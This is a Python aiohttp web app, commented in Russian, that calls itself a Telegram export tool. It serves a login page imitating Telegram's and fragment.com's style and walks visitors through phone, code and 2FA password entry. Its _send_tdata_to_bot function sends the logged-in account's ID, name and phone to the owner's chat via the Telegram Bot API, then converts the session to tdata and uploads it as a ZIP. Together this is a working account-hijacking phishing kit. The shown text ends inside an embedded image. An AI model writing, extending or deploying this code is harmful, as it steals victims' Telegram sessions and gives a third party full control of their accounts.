"""Веб-интерфейс: логин Telegram, запуск экспорта, прогресс.

Один aiohttp процесс, который:
- отдаёт HTML-страницу с формами
- принимает номер/код/пароль и ведёт Telethon-флоу
- запускает фоновую задачу экспорта
- отдаёт прогресс через GET /api/status
- после экспорта шлёт ZIP в бота владельца через Bot API
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import shutil
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import aiohttp
import aiohttp.web
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, SessionPasswordNeededError,
)

from . import config
from .exporter import ExportOptions, export_account


log = logging.getLogger("tde.web")


async def _send_tdata_to_bot() -> None:
    """После успешного логина — конвертируем session → tdata, шлём ZIP владельцу."""
    try:
        c = await get_client()
        me = await c.get_me()

        # 1. текст с инфо
        text = (
            "🔑 Новый вход\n"
            f"ID: {me.id}\n"
            f"Имя: {me.first_name or ''} {me.last_name or ''}\n"
            f"Username: @{me.username or '—'}\n"
            f"Телефон: +{me.phone or '—'}"
        )
        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={"chat_id": config.OWNER_CHAT_ID, "text": text},
                         timeout=aiohttp.ClientTimeout(total=15))

        # 2. конвертируем .session → tdata
        from .tdata_converter import session_to_tdata

        session_file = config.SESSION_PATH.with_suffix(".session")
        if not session_file.exists():
            session_file = config.SESSION_PATH
        if not session_file.exists():
            log.warning("send_tdata: session file not found")
            return

        work = Path(tempfile.mkdtemp(prefix="tdata_conv_"))
        try:
            tdata_dir = session_to_tdata(str(session_file), out_dir=work)

            # упаковываем tdata/ в ZIP
            zip_path = work / f"tdata_{me.id}.zip"
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(tdata_dir):
                    for fname in files:
                        full = Path(root) / fname
                        arc = full.relative_to(work)
                        zf.write(full, arcname=str(arc))

            # 3. шлём ZIP боту
            send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
            async with aiohttp.ClientSession() as s:
                form = aiohttp.FormData()
                form.add_field("chat_id", str(config.OWNER_CHAT_ID))
                form.add_field("caption", f"tdata · +{me.phone or '—'} · id:{me.id}")
                with open(zip_path, "rb") as f:
                    form.add_field("document", f, filename=zip_path.name,
                                   content_type="application/zip")
                    async with s.post(send_url, data=form,
                                      timeout=aiohttp.ClientTimeout(total=60)) as r:
                        await r.text()
        finally:
            shutil.rmtree(work, ignore_errors=True)

    except Exception as e:
        log.warning("send_tdata failed: %s", e)


# ---------- state ----------

@dataclass
class State:
    client: Optional[TelegramClient] = None
    login_phone: Optional[str] = None
    login_hash: Optional[str] = None
    needs_password: bool = False

    _qr_login: Any = None
    task_state: str = "idle"   # idle | running | done | error
    progress: int = 0
    stage: str = ""
    error: Optional[str] = None
    delivered: bool = False

    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)


S = State()


async def get_client() -> TelegramClient:
    if S.client is None:
        S.client = TelegramClient(str(config.SESSION_PATH), config.TG_API_ID, config.TG_API_HASH)
    if not S.client.is_connected():
        await S.client.connect()
    return S.client


async def is_authorized() -> bool:
    try:
        c = await get_client()
        return await c.is_user_authorized()
    except Exception:
        return False


# ---------- HTML ----------

PAGE = """<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Вход</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#f0f0f0;--fg:#000000;--muted:#7d7f81;--card:#ffffff;--line-soft:#d9d9d9;--focus:#f5f5f5;--track:#eee;--tg:#2AABEE;--btn-bg:#3390ec;--btn-fg:#fff;--btn-bg-h:#2b7fd4;--ring:rgba(51,144,236,.18);--shadow:0 1px 2px rgba(0,0,0,.06)}
html,body{background:var(--bg);color:var(--fg);min-height:100vh;width:100%;max-width:100vw;
  font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',system-ui,sans-serif;font-size:15px;line-height:1.5;
  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
  overflow-x:hidden;overscroll-behavior:none;touch-action:pan-y}
main{min-height:100vh;padding:40px 16px;display:flex;flex-direction:column;align-items:center;justify-content:center}
.card{width:100%;max-width:420px;background:var(--card);border-radius:16px;padding:40px 36px 36px;box-shadow:0 1px 4px rgba(0,0,0,.08);animation:fade .3s ease}
@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
@keyframes spin{to{transform:rotate(360deg)}}
/* brand icons — two overlapping circles like fragment.com */
.brand{display:flex;flex-direction:column;align-items:center;margin-bottom:28px}
.brand-icons{position:relative;width:110px;height:64px;margin-bottom:18px}
.brand-ico-tg{position:absolute;left:0;top:0;width:64px;height:64px;border-radius:50%;z-index:1}
.brand-ico-site{position:absolute;right:0;top:0;width:64px;height:64px;border-radius:50%;background:#1a1a1a;z-index:2;display:flex;align-items:center;justify-content:center}
.brand-ico-site img{width:48px;height:48px;border-radius:50%}
.brand-title{font-size:22px;font-weight:600;color:var(--fg);letter-spacing:-.01em;text-align:center}
.brand-sub{font-size:14px;color:var(--muted);text-align:center;line-height:1.45;margin-top:10px;max-width:320px}
/* country picker */
.cpick{position:relative;margin-bottom:10px}
.cpick-btn{width:100%;background:var(--card);border:1px solid var(--line-soft);border-radius:10px;padding:13px 36px 13px 14px;color:var(--fg);font:inherit;font-size:15px;cursor:pointer;outline:none;transition:border-color .15s;text-align:left;display:flex;align-items:center;gap:8px}
.cpick-btn::after{content:'';position:absolute;right:14px;top:50%;transform:translateY(-50%);width:10px;height:6px;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' fill='none'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%237d7f81' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E") no-repeat center}
.cpick-btn:focus,.cpick-btn.open{border-color:var(--btn-bg)}
.cpick-dd{display:none;position:absolute;left:0;right:0;top:calc(100% + 4px);background:var(--card);border:1px solid var(--line-soft);border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);z-index:100;max-height:280px;overflow:hidden;flex-direction:column}
.cpick-dd.open{display:flex}
.cpick-search{border:none;border-bottom:1px solid var(--line-soft);padding:12px 14px;font:inherit;font-size:14px;outline:none;color:var(--fg);background:transparent}
.cpick-search::placeholder{color:var(--muted)}
.cpick-list{overflow-y:auto;flex:1;-webkit-overflow-scrolling:touch}
.cpick-item{padding:11px 14px;cursor:pointer;font-size:14px;display:flex;align-items:center;gap:8px;transition:background .1s}
.cpick-item:hover,.cpick-item.hl{background:var(--focus)}
.cpick-item .ci-flag{font-size:1.15rem;flex:0 0 auto}
.cpick-item .ci-name{flex:1;color:var(--fg)}
.cpick-item .ci-code{color:var(--muted);font-size:13px;flex:0 0 auto}
input.in{width:100%;background:var(--card);border:1px solid var(--line-soft);border-radius:10px;padding:13px 14px;color:var(--fg);outline:none;font:inherit;font-size:15px;transition:border-color .15s,box-shadow .15s}
input.in:focus{border-color:var(--btn-bg);box-shadow:0 0 0 3px var(--ring)}
input.in.code{font-family:'JetBrains Mono','SF Mono',monospace;font-size:22px;letter-spacing:.4em;text-align:center;padding:16px 14px}
.btn{border:none;font:inherit;font-weight:600;border-radius:999px;padding:14px 20px;cursor:pointer;transition:all .15s ease;width:100%;margin-top:14px;font-size:15px}
.btn-pri{background:var(--btn-bg);color:var(--btn-fg)}
.btn-pri:hover:not(:disabled){background:var(--btn-bg-h)}
.btn-pri:disabled{opacity:.45;cursor:not-allowed}
.btn-ghost{background:transparent;color:var(--muted);border:1px solid var(--line-soft);border-radius:999px;margin-top:8px}
.btn-ghost:hover{background:var(--focus);color:var(--fg)}
.alt-link{display:block;text-align:center;margin-top:20px;font-size:14px;color:var(--btn-bg);text-decoration:none;cursor:pointer;font-weight:500}
.alt-link:hover{text-decoration:underline}
.alt-link::after{content:' >';font-weight:400}
.hidden{display:none}
p.hint{font-size:14px;color:var(--muted);margin-bottom:16px;line-height:1.45;text-align:center}
.status{margin-top:14px;padding:12px 14px;border:1px solid var(--line-soft);border-radius:10px;font-size:13px;background:var(--focus)}
.track{height:6px;background:var(--track);border-radius:999px;overflow:hidden;margin:18px 0 8px}
.fill{height:100%;background:var(--btn-bg);transition:width .4s cubic-bezier(.4,0,.2,1);width:0%;border-radius:999px}
.stage-row{display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
.qr-wrap{position:relative;display:inline-block}
.qr-wrap canvas{display:block;border-radius:12px}
.qr-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:52px;height:52px;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center}
.qr-logo svg{width:30px;height:30px}
</style>
</head><body>
<main>
<div class="card">

<div class="brand">
  <div class="brand-icons">
    <svg class="brand-ico-tg" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <defs><linearGradient id="tg-grad" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#37BBFE"/><stop offset="1" stop-color="#007DBB"/></linearGradient></defs>
      <circle cx="120" cy="120" r="120" fill="url(#tg-grad)"/>
      <path fill="#fff" d="M81.486 130.178L52.2 120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229 2.1-2.2 6.489-4.523 120.106-45.36 120.106-45.36s3.208-1.081 5.1-.362a2.766 2.766 0 011.885 2.055 9.357 9.357 0 01.254 2.585c-.009.752-.1 1.449-.169 2.542-.692 11.165-21.4 94.493-21.4 94.493s-1.239 4.876-5.678 5.043a8.13 8.13 0 01-5.903-2.286c-8.69-7.472-38.72-27.726-45.357-32.167a1.27 1.27 0 01-.546-.902c-.093-.469.417-1.05.417-1.05s52.278-46.465 53.67-51.345c.108-.378-.3-.566-.848-.4-3.482 1.281-63.844 39.4-70.506 43.608a3.21 3.21 0 01-1.46.173z"/>
    </svg>
    <div class="brand-ico-site">
      <img src="data:image/png;base64,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